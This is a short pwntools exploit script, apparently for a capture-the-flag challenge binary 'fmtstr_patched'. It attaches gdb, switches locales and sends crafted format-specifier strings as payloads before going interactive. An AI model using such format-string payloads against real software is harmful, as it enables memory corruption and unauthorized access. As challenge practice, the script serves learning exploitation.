#!/usr/bin/env python3

from pwn import *

exe = ELF("./fmtstr_patched")

p = process([exe.path])
def GDB():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript='''

               b*0x13a8+0x555555554000


           ''')
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

# pwning lmao lmao dark bruh
def main():
    GDB()
    sla(b">",b"2")
    sla(b"locale:",b"gd_GB.utf8")
    sla(b">",b"1")
    sla(b"specifier:",b"%D%D%%%%%%%%%%%%%A")
    sla(b">",b"2")
    sla(b"locale:",b"hu_HU.utf8")
    sla(b">",b"1")
    sla(b"specifier:",b"%D%D%D%%%B")


























    p.interactive()


if __name__ == "__main__":
    main()
